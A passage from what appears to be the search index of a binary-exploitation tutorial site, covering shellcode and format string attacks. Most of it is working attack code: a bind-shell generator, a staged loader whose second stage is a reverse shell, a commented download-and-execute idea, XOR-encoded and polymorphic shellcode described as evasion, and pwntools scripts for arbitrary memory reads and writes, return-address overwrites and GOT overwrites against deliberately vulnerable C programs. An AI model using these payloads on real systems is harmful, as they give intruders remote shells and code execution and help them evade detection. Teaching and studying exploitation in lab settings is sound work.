INADDR_ANY */\n        push r9             /* padding */\n\n        mov r9w, {hex(u16(port_hex))}\n        shl r9, 16\n        add r9w, 2          /* AF_INET */\n        push r9\n\n        mov rsi, rsp        /* &amp;addr */\n        mov dl, 16          /* sizeof(addr) */\n        syscall\n\n        /* listen(sockfd, 1) */\n        xor rax, rax\n        mov al, 50          /* sys_listen */\n        mov rdi, r8         /* sockfd */\n        xor rsi, rsi\n        mov sil, 1          /* backlog */\n        syscall\n\n        /* accept(sockfd, NULL, NULL) */\n        xor rax, rax\n        mov al, 43          /* sys_accept */\n        mov rdi, r8         /* sockfd */\n        xor rsi, rsi        /* addr = NULL */\n        xor rdx, rdx        /* addrlen = NULL */\n        syscall\n\n        mov r9, rax         /* save client fd */\n\n        /* dup2(clientfd, 0/1/2) */\n        mov rdi, r9         /* clientfd */\n        xor rsi, rsi        /* stdin */\n        mov al, 33          /* sys_dup2 */\n        syscall\n\n        mov rdi, r9         /* clientfd */\n        mov sil, 1          /* stdout */\n        mov al, 33          /* sys_dup2 */\n        syscall\n\n        mov rdi, r9         /* clientfd */\n        mov sil, 2          /* stderr */\n        mov al, 33          /* sys_dup2 */\n        syscall\n\n        /* execve(\"/bin/sh\", NULL, NULL) */\n        xor rax, rax\n        push rax\n        mov rdi, 0x68732f2f6e69622f\n        push rdi\n        mov rdi, rsp\n        xor rsi, rsi\n        xor rdx, rdx\n        mov al, 59          /* sys_execve */\n        syscall\n    ''')\n\n    print(f\"Bind shell shellcode for port {port} ({len(shellcode)} bytes)\")\n    print(shellcode.hex())\n\n    return shellcode\n\n# Generate bind shell for port 4444\nbind_shell_shellcode(4444)\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#staged-shellcode","title":"Staged Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\n\ndef staged_shellcode():\n    \"\"\"Generate multi-stage shellcode\"\"\"\n\n    # Stage 1: Small loader that reads larger payload\n    stage1 = asm('''\n        /* read(stdin, buffer, size) */\n        xor rax, rax        /* sys_read */\n        xor rdi, rdi        /* stdin */\n\n        /* Find a writable location (using current stack) */\n        mov rsi, rsp\n        sub rsi, 0x1000     /* buffer at stack - 4KB */\n\n        mov rdx, 0x1000     /* read up to 4KB */\n        syscall\n\n        /* Jump to received shellcode */\n        jmp rsi\n    ''')\n\n    print(f\"Stage 1 loader ({len(stage1)} bytes):\")\n    print(stage1.hex())\n\n    # Stage 2: Full payload (example: reverse shell)\n    stage2 = reverse_shell_shellcode(\"192.168.1.100\", 4444)\n\n    return stage1, stage2\n\ndef download_exec_shellcode(url):\n    \"\"\"Generate shellcode that downloads and executes payload\"\"\"\n\n    # Simplified version - real implementation would need HTTP client\n    shellcode = asm(f'''\n        /* This is a conceptual example */\n        /* Real implementation would need to: */\n        /* 1. Create socket connection to web server */\n        /* 2. Send HTTP GET request */\n        /* 3. Parse HTTP response */\n        /* 4. Execute downloaded payload */\n\n        /* For now, just execute a command */\n        xor rax, rax\n        push rax\n\n        /* Push \"wget URL -O /tmp/payload &amp;&amp; chmod +x /tmp/payload &amp;&amp; /tmp/payload\" */\n        /* This is simplified - real version would be more complex */\n\n        mov rdi, rsp        /* command */\n        mov rsi, 0          /* argv */\n        mov rdx, 0          /* envp */\n        mov rax, 59         /* sys_execve */\n        syscall\n    ''')\n\n    return shellcode\n\nstage1, stage2 = staged_shellcode()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#shellcode-encoding-and-evasion","title":"Shellcode Encoding and Evasion","text":""},{"location":"binary-exploitation/fundamentals/03-shellcode/#xor-encoding","title":"XOR Encoding","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef xor_encode_shellcode(shellcode, key=0x41):\n    \"\"\"XOR encode shellcode to avoid bad characters\"\"\"\n\n    encoded = bytes([b ^ key for b in shellcode])\n\n    # Decoder stub\n    decoder = asm(f'''\n        jmp short call_decoder\n\n    decoder:\n        pop esi                    /* Get shellcode address */\n        xor ecx, ecx\n        mov cl, {len(shellcode)}   /* Shellcode length */\n\n    decode_loop:\n        xor byte ptr [esi], {hex(key)}  /* XOR decode */\n        inc esi\n        loop decode_loop\n\n        jmp short shellcode_start   /* Jump to decoded shellcode */\n\n    call_decoder:\n        call decoder\n        shellcode_start:\n    ''')\n\n    # Combine decoder + encoded shellcode\n    full_payload = decoder + encoded\n\n    print(f\"Original shellcode: {shellcode.hex()}\")\n    print(f\"XOR key: 0x{key:02x}\")\n    print(f\"Encoded shellcode: {encoded.hex()}\")\n    print(f\"Full payload with decoder: {full_payload.hex()}\")\n\n    return full_payload\n\n# Example usage\noriginal = asm(shellcraft.sh())\nencoded_payload = xor_encode_shellcode(original)\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#alphanumeric-shellcode","title":"Alphanumeric Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef generate_alphanumeric_shellcode():\n    \"\"\"Generate shellcode using only alphanumeric characters\"\"\"\n\n    # This is complex and typically done with specialized tools\n    # Here's a conceptual example\n\n    # Alphanumeric characters: 0-9, A-Z, a-z\n    # ASCII values: 0x30-0x39, 0x41-0x5A, 0x61-0x7A\n\n    # Use self-modifying code technique\n    shellcode = asm('''\n        /* Use only alphanumeric instructions */\n        /* This is a simplified example */\n\n        and eax, 0x454e4f4a     /* Clear eax using alphanumeric */\n        and eax, 0x3a313035     /* More clearing */\n\n        push eax                /* Push NULL */\n\n        /* Build \"/bin/sh\" using only alphanumeric operations */\n        push 0x68732f2f         /* This would need encoding */\n        push 0x6e69622f\n\n        /* Continue with alphanumeric-only instructions */\n    ''')\n\n    # Check if all bytes are alphanumeric\n    alphanumeric = all(\n        (0x30 &lt;= b &lt;= 0x39) or  # 0-9\n        (0x41 &lt;= b &lt;= 0x5A) or  # A-Z\n        (0x61 &lt;= b &lt;= 0x7A)     # a-z\n        for b in shellcode\n    )\n\n    print(f\"Is alphanumeric: {alphanumeric}\")\n    print(f\"Shellcode: {shellcode.hex()}\")\n\n    return shellcode\n\ngenerate_alphanumeric_shellcode()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#polymorphic-shellcode","title":"Polymorphic Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport random\n\ndef generate_polymorphic_shellcode(base_shellcode):\n    \"\"\"Generate different variants of the same shellcode\"\"\"\n\n    variants = []\n\n    # Variant 1: Add NOPs\n    nop_count = random.randint(5, 15)\n    variant1 = asm('nop\\n' * nop_count) + base_shellcode\n    variants.append(variant1)\n\n    # Variant 2: Use equivalent instructions\n    # Instead of \"xor eax, eax\", use \"sub eax, eax\" or \"and eax, 0\"\n    variant2 = asm('''\n        sub eax, eax        /* Equivalent to xor eax, eax */\n        push eax\n        mov eax, 0x68732f2f\n        push eax\n        mov eax, 0x6e69622f\n        push eax\n        mov ebx, esp\n        push eax\n        push ebx\n        mov ecx, esp\n        mov al, 11\n        int 0x80\n    ''')\n    variants.append(variant2)\n\n    # Variant 3: Use different register allocation\n    variant3 = asm('''\n        xor ebx, ebx        /* Use ebx instead of eax for clearing */\n        push ebx\n        mov ebx, 0x68732f2f\n        push ebx\n        mov ebx, 0x6e69622f\n        push ebx\n        mov ebx, esp\n        xor eax, eax\n        push eax\n        push ebx\n        mov ecx, esp\n        mov al, 11\n        int 0x80\n    ''')\n    variants.append(variant3)\n\n    for i, variant in enumerate(variants):\n        print(f\"Variant {i+1} ({len(variant)} bytes): {variant.hex()}\")\n\n    return variants\n\n# Generate polymorphic variants\nbase = asm(shellcraft.sh())\nvariants = generate_polymorphic_shellcode(base)\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#testing-and-debugging-shellcode","title":"Testing and Debugging Shellcode","text":""},{"location":"binary-exploitation/fundamentals/03-shellcode/#shellcode-testing-framework","title":"Shellcode Testing Framework","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport tempfile\nimport os\n\nclass ShellcodeTester:\n    def __init__(self, arch='amd64'):\n        self.arch = arch\n        context.arch = arch\n\n    def test_in_c_wrapper(self, shellcode):\n        \"\"\"Test shellcode by embedding in C program\"\"\"\n\n        c_template = f'''\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;sys/mman.h&gt;\n\nint main() {{\n    unsigned char shellcode[] = \n        \"{shellcode.hex()}\";\n\n    printf(\"Shellcode length: %d\\\\n\", sizeof(shellcode)-1);\n\n    // Create executable memory\n    void *exec_mem = mmap(NULL, sizeof(shellcode), \n                         PROT_READ | PROT_WRITE | PROT_EXEC,\n                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n    if (exec_mem == MAP_FAILED) {{\n        perror(\"mmap\");\n        return 1;\n    }}\n\n    // Copy shellcode\n    memcpy(exec_mem, shellcode, sizeof(shellcode)-1);\n\n    printf(\"Executing shellcode...\\\\n\");\n\n    // Execute shellcode\n    ((void(*)())exec_mem)();\n\n    return 0;\n}}\n'''\n\n        # Write C file\n        with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:\n            f.write(c_template)\n            c_file = f.name\n\n        # Compile and run\n        binary = c_file.replace('.c', '')\n\n        try:\n            # Compile\n            result = subprocess.run([\n                'gcc', '-z', 'execstack', '-fno-stack-protector',\n                c_file, '-o', binary\n            ], capture_output=True, text=True)\n\n            if result.returncode != 0:\n                print(f\"Compilation failed: {result.stderr}\")\n                return False\n\n            print(f\"Shellcode test binary created: {binary}\")\n            print(\"Run manually to test shellcode execution\")\n\n            return True\n\n        finally:\n            # Cleanup\n            if os.path.exists(c_file):\n                os.unlink(c_file)\n\n    def check_bad_chars(self, shellcode, bad_chars=None):\n        \"\"\"Check for bad characters in shellcode\"\"\"\n\n        if bad_chars is None:\n            bad_chars = [b'\\x00', b'\\x0a', b'\\x0d']  # NULL, LF, CR\n\n        found_bad = []\n        for bad_char in bad_chars:\n            if bad_char in shellcode:\n                found_bad.append(bad_char.hex())\n\n        if found_bad:\n            print(f\"Bad characters found: {', '.join(found_bad)}\")\n            return False\n        else:\n            print(\"No bad characters found\")\n            return True\n\n    def analyze_shellcode(self, shellcode):\n        \"\"\"Comprehensive shellcode analysis\"\"\"\n\n        print(f\"Shellcode Analysis:\")\n        print(f\"Length: {len(shellcode)} bytes\")\n        print(f\"Hex: {shellcode.hex()}\")\n\n        # Disassemble\n        print(f\"\\nDisassembly:\")\n        print(disasm(shellcode))\n\n        # Check for bad characters\n        self.check_bad_chars(shellcode)\n\n        # Entropy analysis\n        import collections\n        byte_counts = collections.Counter(shellcode)\n        entropy = -sum((count/len(shellcode)) * math.log2(count/len(shellcode)) \n                      for count in byte_counts.values())\n        print(f\"Entropy: {entropy:.2f}\")\n\n# Usage example\ntester = ShellcodeTester()\nshellcode = asm(shellcraft.sh())\n\ntester.analyze_shellcode(shellcode)\ntester.test_in_c_wrapper(shellcode)\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#gdb-shellcode-debugging","title":"GDB Shellcode Debugging","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef debug_shellcode_with_gdb(shellcode):\n    \"\"\"Debug shellcode execution with GDB\"\"\"\n\n    # Create test binary\n    c_code = f'''\n#include &lt;sys/mman.h&gt;\n#include &lt;string.h&gt;\n\nint main() {{\n    unsigned char code[] = \"{shellcode.hex()}\";\n\n    void *exec_mem = mmap(NULL, sizeof(code), \n                         PROT_READ | PROT_WRITE | PROT_EXEC,\n                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n    memcpy(exec_mem, code, sizeof(code)-1);\n\n    __asm__(\"int3\");  // Breakpoint before execution\n\n    ((void(*)())exec_mem)();\n\n    return 0;\n}}\n'''\n\n    with open('shellcode_debug.c', 'w') as f:\n        f.write(c_code)\n\n    # Compile\n    os.system('gcc -g -z execstack -o shellcode_debug shellcode_debug.c')\n\n    # Generate GDB script\n    gdb_script = '''\nset disassembly-flavor intel\nbreak main\nrun\n# Step to the int3 breakpoint\ncontinue\n# Now step into shellcode\nstepi\n# Examine memory and registers\ninfo registers\nx/20i $pc\n'''\n\n    with open('debug.gdb', 'w') as f:\n        f.write(gdb_script)\n\n    print(\"Created shellcode_debug binary and debug.gdb script\")\n    print(\"Run: gdb -x debug.gdb ./shellcode_debug\")\n\n# Usage\nshellcode = asm(shellcraft.sh())\ndebug_shellcode_with_gdb(shellcode)\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#platform-specific-shellcode","title":"Platform-Specific Shellcode","text":""},{"location":"binary-exploitation/fundamentals/03-shellcode/#windows-shellcode","title":"Windows Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\n# Windows shellcode is more complex due to different system call interface\ndef windows_shellcode_example():\n    \"\"\"Example Windows shellcode structure\"\"\"\n\n    # Windows uses different calling conventions\n    # Need to find kernel32.dll and call WinAPI functions\n\n    # This is a conceptual example - real Windows shellcode is much more complex\n    shellcode_concept = '''\n    ; Windows shellcode typically needs to:\n    ; 1. Find kernel32.dll base address\n    ; 2. Find GetProcAddress function\n    ; 3. Use GetProcAddress to find other functions (CreateProcess, etc.)\n    ; 4. Call CreateProcess to spawn cmd.exe\n\n    ; Find kernel32.dll from PEB\n    xor ecx, ecx\n    mov eax, fs:[0x30]      ; PEB\n    mov eax, [eax + 0x0c]   ; PEB-&gt;Ldr\n    mov esi, [eax + 0x1c]   ; PEB-&gt;Ldr.InInitializationOrderModuleList\n    lodsd                   ; Skip first entry (ntdll.dll)\n    xchg eax, esi\n    lodsd                   ; Second entry (kernel32.dll)\n    mov ebx, [eax + 0x08]   ; DllBase\n\n    ; Find GetProcAddress\n    ; ... (complex parsing of PE headers)\n\n    ; Call CreateProcess\n    ; ... (setup parameters and call)\n    '''\n\n    print(\"Windows shellcode is significantly more complex than Linux\")\n    print(\"Requires finding API functions dynamically\")\n    print(\"Consider using msfvenom for Windows payloads\")\n\nwindows_shellcode_example()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#macos-shellcode","title":"macOS Shellcode","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef macos_shellcode():\n    \"\"\"macOS/BSD shellcode example\"\"\"\n\n    # macOS uses different system call numbers and conventions\n    context.arch = 'amd64'\n\n    shellcode = asm('''\n        /* macOS execve(\"/bin/sh\") */\n        xor rax, rax\n        push rax            /* null terminator */\n\n        /* Push \"/bin/sh\" */\n        mov rbx, 0x68732f2f6e69622f\n        push rbx\n\n        mov rdi, rsp        /* filename */\n        xor rsi, rsi        /* argv */\n        xor rdx, rdx        /* envp */\n\n        mov rax, 0x200003b  /* sys_execve on macOS (0x2000000 + 59) */\n        syscall\n    ''')\n\n    print(f\"macOS shellcode ({len(shellcode)} bytes):\")\n    print(shellcode.hex())\n\n    return shellcode\n\nmacos_shellcode()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#shellcode-optimization","title":"Shellcode Optimization","text":""},{"location":"binary-exploitation/fundamentals/03-shellcode/#size-optimization","title":"Size Optimization","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef optimize_shellcode_size():\n    \"\"\"Demonstrate shellcode size optimization techniques\"\"\"\n\n    context.arch = 'amd64'\n\n    # Unoptimized version\n    unoptimized = asm('''\n        mov rax, 0          /* 7 bytes */\n        mov rbx, 0          /* 7 bytes */\n        mov rcx, 0          /* 7 bytes */\n        mov rdx, 0          /* 7 bytes */\n    ''')\n\n    # Optimized version\n    optimized = asm('''\n        xor rax, rax        /* 3 bytes */\n        xor rbx, rbx        /* 3 bytes */\n        xor rcx, rcx        /* 3 bytes */\n        xor rdx, rdx        /* 3 bytes */\n    ''')\n\n    # Even more optimized\n    ultra_optimized = asm('''\n        xor rax, rax        /* 3 bytes */\n        cdq                 /* 1 byte - extends rax to rdx (both become 0) */\n        mov rbx, rax        /* 3 bytes */\n        mov rcx, rax        /* 3 bytes */\n    ''')\n\n    print(f\"Unoptimized: {len(unoptimized)} bytes\")\n    print(f\"Optimized: {len(optimized)} bytes\")\n    print(f\"Ultra optimized: {len(ultra_optimized)} bytes\")\n\n    # Demonstrate smallest possible execve\n    tiny_execve = asm('''\n        xor eax, eax\n        push rax\n        push 0x68732f2f6e69622f\n        mov rdi, rsp\n        push rax\n        push rdi\n        mov rsi, rsp\n        mov al, 59\n        cdq\n        syscall\n    ''')\n\n    print(f\"Tiny execve shellcode: {len(tiny_execve)} bytes\")\n    print(f\"Hex: {tiny_execve.hex()}\")\n\noptimize_shellcode_size()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/03-shellcode/#key-takeaways","title":"Key Takeaways","text":"<p>Shellcode Development Fundamentals</p> <ul> <li>Position independence - Code must work at any memory location</li> <li>Size matters - Smaller shellcode fits in tighter spaces</li> <li>Null-byte avoidance - Prevent string termination issues</li> <li>System call knowledge - Understanding OS interfaces is crucial</li> <li>Testing is essential - Always verify shellcode functionality</li> </ul> <p>Common Pitfalls</p> <ul> <li>Including null bytes that terminate string functions</li> <li>Platform-specific assumptions (syscall numbers, calling conventions)</li> <li>Forgetting about stack alignment requirements</li> <li>Not testing in realistic environments</li> <li>Hardcoding addresses that may not be available</li> </ul> <p>Development Best Practices</p> <ul> <li>Start with working assembly code, then optimize</li> <li>Use tools like pwntools for rapid prototyping</li> <li>Test thoroughly in controlled environments</li> <li>Consider encoding techniques for evasion</li> <li>Keep platform differences in mind</li> </ul> <p>Next: Format String Attacks</p>"},{"location":"binary-exploitation/memory/01-format-string/","title":"Format String Attacks","text":"<p>Format string vulnerabilities occur when user-controlled input is passed directly to format string functions like <code>printf()</code>, <code>sprintf()</code>, or <code>fprintf()</code> without proper validation. These vulnerabilities can lead to information disclosure, memory corruption, and arbitrary code execution.</p>"},{"location":"binary-exploitation/memory/01-format-string/#understanding-format-strings","title":"Understanding Format Strings","text":""},{"location":"binary-exploitation/memory/01-format-string/#how-format-strings-work","title":"How Format Strings Work","text":"<p>Format string functions use format specifiers to determine how to interpret and display data:</p> <pre><code>// Normal usage\nprintf(\"Hello %s, you are %d years old\\n\", name, age);\n\n// Vulnerable usage\nprintf(user_input);  // DANGEROUS: user controls format string\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#format-specifiers","title":"Format Specifiers","text":"<pre><code>Common Format Specifiers:\n%d, %i    - signed integer\n%u        - unsigned integer  \n%x, %X    - hexadecimal\n%o        - octal\n%s        - string\n%c        - character\n%p        - pointer\n%n        - write number of chars printed so far\n%hn       - write to short\n%hhn      - write to char\n%ln       - write to long\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#the-stack-and-format-strings","title":"The Stack and Format Strings","text":"<pre><code>Stack Layout During printf():\nHigh Address\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Format String     \u2502 \u2190 1st argument (RDI)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Argument 1        \u2502 \u2190 2nd argument (RSI)  \n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Argument 2        \u2502 \u2190 3rd argument (RDX)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Argument 3        \u2502 \u2190 4th argument (RCX)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Stack Arguments   \u2502 \u2190 Additional arguments\n\u2502   ...               \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\nLow Address\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#vulnerable-code-examples","title":"Vulnerable Code Examples","text":""},{"location":"binary-exploitation/memory/01-format-string/#basic-format-string-bug","title":"Basic Format String Bug","text":"<pre><code>// vuln_printf.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid vulnerable_function() {\n    char buffer[256];\n\n    printf(\"Enter input: \");\n    fgets(buffer, sizeof(buffer), stdin);\n\n    // VULNERABLE: User input used directly as format string\n    printf(buffer);\n\n    printf(\"Function completed\\n\");\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n</code></pre> <p>Compilation: <pre><code># Compile with minimal protections for learning\ngcc -fno-stack-protector -no-pie -o vuln_printf vuln_printf.c\n</code></pre></p>"},{"location":"binary-exploitation/memory/01-format-string/#sprintf-vulnerability","title":"sprintf Vulnerability","text":"<pre><code>// vuln_sprintf.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nchar global_buffer[1024];\n\nvoid log_message(char *user_msg) {\n    char log_entry[512];\n\n    // VULNERABLE: sprintf with user-controlled format\n    sprintf(log_entry, user_msg);\n\n    strcat(global_buffer, log_entry);\n    printf(\"Logged: %s\\n\", log_entry);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf(\"Usage: %s &lt;message&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    log_message(argv[1]);\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#fprintf-vulnerability","title":"fprintf Vulnerability","text":"<pre><code>// vuln_fprintf.c\n#include &lt;stdio.h&gt;\n\nvoid write_log(char *entry) {\n    FILE *logfile = fopen(\"app.log\", \"a\");\n    if (logfile) {\n        // VULNERABLE: fprintf with user input as format\n        fprintf(logfile, entry);\n        fclose(logfile);\n    }\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) return 1;\n\n    write_log(argv[1]);\n    printf(\"Entry logged\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#exploitation-techniques","title":"Exploitation Techniques","text":""},{"location":"binary-exploitation/memory/01-format-string/#information-disclosure","title":"Information Disclosure","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef stack_reading():\n    \"\"\"Read stack values using format string\"\"\"\n\n    p = process('./vuln_printf')\n\n    # Read first 20 stack values\n    payload = b'%p.' * 20\n    p.sendline(payload)\n\n    # Receive and parse output\n    output = p.recvall()\n    print(\"Stack values:\")\n\n    values = output.split(b'.')\n    for i, value in enumerate(values):\n        try:\n            if value.startswith(b'0x'):\n                addr = int(value, 16)\n                print(f\"Stack[{i}]: 0x{addr:016x}\")\n        except:\n            continue\n\ndef read_specific_offset():\n    \"\"\"Read specific stack offset\"\"\"\n\n    p = process('./vuln_printf')\n\n    # Read 6th stack value directly\n    payload = b'%6$p'\n    p.sendline(payload)\n\n    output = p.recvall()\n    print(f\"6th stack value: {output}\")\n\ndef read_memory_as_string():\n    \"\"\"Read memory content as string\"\"\"\n\n    p = process('./vuln_printf')\n\n    # Try to read memory at stack locations as strings\n    for i in range(1, 10):\n        payload = f'%{i}$s'.encode()\n        p = process('./vuln_printf')\n        p.sendline(payload)\n\n        try:\n            output = p.recvall(timeout=1)\n            if len(output) &gt; 20:  # Found interesting string\n                print(f\"String at offset {i}: {output}\")\n        except:\n            pass\n\n        p.close()\n\nstack_reading()\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#finding-format-string-offset","title":"Finding Format String Offset","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef find_format_offset():\n    \"\"\"Find the offset where our input appears on stack\"\"\"\n\n    # Use a unique pattern\n    pattern = b'AAAABBBB'\n\n    for offset in range(1, 50):\n        p = process('./vuln_printf')\n\n        # Create payload that reads specific offset as hex\n        payload = pattern + f'%{offset}$p'.encode()\n        p.sendline(payload)\n\n        output = p.recvall()\n\n        # Check if our pattern appears in the output\n        if b'41414141' in output or b'42424242' in output:\n            print(f\"Found input at offset: {offset}\")\n            print(f\"Output: {output}\")\n            break\n\n        p.close()\n\ndef automated_offset_finding():\n    \"\"\"Automated offset finding with De Bruijn sequence\"\"\"\n\n    # Generate unique pattern\n    pattern = cyclic(64)\n\n    p = process('./vuln_printf')\n\n    # Send pattern followed by format specifiers\n    payload = pattern + b'%p.' * 20\n    p.sendline(payload)\n\n    output = p.recvall()\n    print(f\"Output: {output}\")\n\n    # Parse output to find where our pattern appears\n    values = output.split(b'.')\n    for i, value in enumerate(values):\n        try:\n            if value.startswith(b'0x'):\n                addr = int(value, 16)\n                # Check if this looks like our pattern\n                packed = p64(addr)\n                if packed in pattern:\n                    offset = cyclic_find(packed[:4])\n                    print(f\"Pattern found at offset {i}, input offset: {offset}\")\n        except:\n            continue\n\nfind_format_offset()\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#arbitrary-memory-read","title":"Arbitrary Memory Read","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef read_arbitrary_address(address):\n    \"\"\"Read arbitrary memory address using format string\"\"\"\n\n    p = process('./vuln_printf')\n\n    # Place target address on stack, then read it as string\n    payload = p64(address)  # Put address on stack\n    payload += b'%8$s'      # Read it as string (adjust offset as needed)\n\n    p.sendline(payload)\n\n    try:\n        output = p.recvall(timeout=2)\n        print(f\"Memory at 0x{address:x}: {output}\")\n        return output\n    except:\n        print(f\"Could not read address 0x{address:x}\")\n        return None\n    finally:\n        p.close()\n\ndef dump_memory_region(start_addr, size):\n    \"\"\"Dump a region of memory\"\"\"\n\n    print(f\"Dumping memory from 0x{start_addr:x} to 0x{start_addr + size:x}\")\n\n    memory_dump = b''\n\n    for offset in range(0, size, 8):  # Read 8 bytes at a time\n        addr = start_addr + offset\n        data = read_arbitrary_address(addr)\n\n        if data:\n            # Extract actual memory content (remove printf output formatting)\n            # This needs adjustment based on actual output format\n            memory_dump += data[:8]  # Adjust based on actual response\n\n    return memory_dump\n\n# Example: Read from program's data section\nread_arbitrary_address(0x404000)  # Adjust address for your binary\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#arbitrary-memory-write","title":"Arbitrary Memory Write","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef write_arbitrary_value(address, value):\n    \"\"\"Write arbitrary value to arbitrary address using %n\"\"\"\n\n    p = process('./vuln_printf')\n\n    # Method 1: Direct %n write\n    # We need to control the number of characters printed before %n\n\n    payload = p64(address)  # Target address on stack\n\n    # Calculate padding to reach desired value\n    chars_needed = value - 8  # Subtract address length\n\n    if chars_needed &gt; 0:\n        payload += b'A' * chars_needed\n\n    payload += b'%8$n'  # Write to address at offset 8 (adjust as needed)\n\n    p.sendline(payload)\n    output = p.recvall()\n    print(f\"Attempted to write {value} to 0x{address:x}\")\n\n    p.close()\n\ndef write_large_value(address, value):\n    \"\"\"Write large values using %hn (short writes)\"\"\"\n\n    # Split large value into smaller parts\n    low_word = value &amp; 0xffff\n    high_word = (value &gt;&gt; 16) &amp; 0xffff\n\n    p = process('./vuln_printf')\n\n    # Write low word\n    payload = p64(address)      # Target address\n    payload += p64(address + 2) # Target address + 2\n\n    # Calculate characters needed for low word\n    chars_for_low = low_word - 16  # Account for the two addresses\n\n    if chars_for_low &gt; 0:\n        payload += b'A' * chars_for_low\n\n    payload += b'%8$hn'  # Write low word\n\n    # Calculate additional characters for high word\n    chars_for_high = high_word - low_word\n\n    if chars_for_high &gt; 0:\n        payload += b'B' * chars_for_high\n\n    payload += b'%9$hn'  # Write high word\n\n    p.sendline(payload)\n    output = p.recvall()\n    print(f\"Attempted to write 0x{value:x} to 0x{address:x}\")\n\n    p.close()\n\ndef overwrite_return_address():\n    \"\"\"Overwrite return address using format string\"\"\"\n\n    # First, find the return address on stack\n    p = process('./vuln_printf')\n\n    # Look for return address pattern\n    payload = b'%p.' * 30\n    p.sendline(payload)\n\n    output = p.recvall()\n    print(\"Stack dump to find return address:\")\n    print(output)\n\n    p.close()\n\n    # Once we find the offset, we can overwrite it\n    # Example: if return address is at offset 22\n    ret_addr_offset = 22\n    new_return_addr = 0x401234  # Address we want to jump to\n\n    p = process('./vuln_printf')\n\n    # Overwrite return address\n    payload = f'%{new_return_addr}d%{ret_addr_offset}$n'.encode()\n    p.sendline(payload)\n\n    # The function should return to our controlled address\n    p.interactive()\n\n# Example usage\nwrite_arbitrary_value(0x404080, 0x41414141)\n</code></pre>"},{"location":"binary-exploitation/memory/01-format-string/#got-overwrite-attack","title":"GOT Overwrite Attack","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef got_overwrite():\n    \"\"\"Overwrite Global Offset Table entries\"\"\"\n\n    # Load binary to find GOT addresses\n    elf = ELF('./vuln_printf')\n\n    # Find GOT entry for a function (e.g., printf)\n    printf_got = elf.got['printf']\n    system_addr = 0x401234  # Address of system() or win function\n\n    print(f\"printf GOT: 0x{printf_got:x}\")\n    print(f\"Overwriting with: 0x{system_addr:x}\")\n\n    p = process('./vuln_printf')\n\n    # Craft payload to overwrite GOT entry\n    payload = p64(printf_got)  # Address to write to\n\n    # Calculate characters needed\n    chars_needed = system_addr - 8  # Subtract address length\n\n    if chars_needed &gt; 0:\n        payload += b'A' * chars_needed\n\n    payload += b'%8$n'  # Write to GOT entry\n\n    p.sendline(payload)\n\n    # Next call to printf will actually call system\n    p.sendline(b'/bin/sh\\x00')\n\n    p.interactive()\n\ndef precise_got_overwrite():\n    